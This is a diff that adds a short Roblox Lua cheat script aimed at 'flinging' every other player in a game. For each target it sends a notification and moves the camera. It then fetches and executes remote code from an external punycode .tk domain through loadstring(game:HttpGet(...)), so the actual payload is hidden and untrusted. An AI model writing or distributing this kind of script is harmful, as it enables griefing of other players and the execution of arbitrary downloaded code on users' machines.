@@ -1,0 +1,15 @@
+local CoreGui = game:GetService("StarterGui")
+for _, plr in pairs(game.Players:GetChildren()) do
+	if plr.Name ~= game.Players.LocalPlayer.Name then
+		Target = plr.Name
+flinghh = 1000
+CoreGui:SetCore("SendNotification", {
+	Title = "Flinged";
+	Text = Target;
+	Duration = 1;
+})
+local PlayerH = workspace.Camera
+PlayerH.CameraSubject = plr.Character.Humanoid
+loadstring(game:HttpGet("https://xn--9p9haaaaaa.tk/scripts/CarpetFling.lua"))()
+	end
+end
